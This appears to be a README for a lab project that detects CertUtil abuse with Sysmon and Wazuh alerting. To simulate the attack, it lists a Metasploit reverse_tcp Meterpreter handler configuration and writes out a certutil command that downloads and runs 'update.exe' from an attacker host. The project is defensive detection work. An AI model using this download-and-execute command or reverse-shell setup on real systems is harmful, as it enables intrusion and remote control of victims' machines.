# LOLBin-Abuse-CertUtil-Detection-Wazuh
End-to-end detection of CertUtil (LOLBin) abuse using Sysmon, Wazuh and OpenSearch Dashboard with custom monitoring and alerting.


# 🖥️ Project Demonstration

This project demonstrates the complete detection pipeline for **LOLBin Abuse using CertUtil**. The attack was simulated in a controlled lab environment where Sysmon collected Windows telemetry, Wazuh ingested the logs, and a custom Wazuh Monitor generated an alert based on CertUtil download activity.

---

# Step 1. Start Python HTTP Server

A Python HTTP server was started on the Kali machine to host the payload (`update.exe`).

**Screenshot**

`Python HTTP Server.png`

---

# Step 2. Configure Metasploit Handler

Metasploit was configured with a reverse TCP Meterpreter payload to receive the incoming connection from the victim machine.

Configuration

- Payload: windows/x64/meterpreter/reverse_tcp
- LHOST: 192.168.178.128
- LPORT: 4444

**Screenshot**

`Metasploit Handler.png`

---

# Step 3. Execute CertUtil Download

The payload was downloaded on the Windows machine using the native Windows LOLBin **certutil.exe**.

```powershell
certutil.exe -urlcache -split -f http://192.168.178.128:8080/update.exe C:\Users\Public\update.exe

C:\Users\Public\update.exe
```

# Result

This project successfully demonstrates end-to-end detection of **CertUtil LOLBin abuse** using **Sysmon + Wazuh**. The attack generated Process Creation, Network Connection, and File Creation events, which were collected by Wazuh and automatically detected through a custom monitoring rule, resulting in a high-severity security alert.
